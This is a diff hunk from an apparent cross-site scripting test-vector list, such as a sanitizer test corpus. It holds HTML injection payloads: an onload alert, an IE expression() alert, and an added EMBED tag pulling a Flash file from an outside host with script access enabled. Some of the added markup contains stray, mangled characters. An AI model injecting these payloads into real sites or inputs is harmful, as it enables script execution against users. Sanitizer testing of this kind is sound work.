@@ -10,7 +10,7 @@
 <img src="#<frameset onload=alert(123)>&{document.vulnerable=true;};" alt="onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)"/>
 
 <img src="<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>">
-
-<!--[if gte IE 4]>;
+<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
+<!--[if gte IE 4]-->
 
 ](()
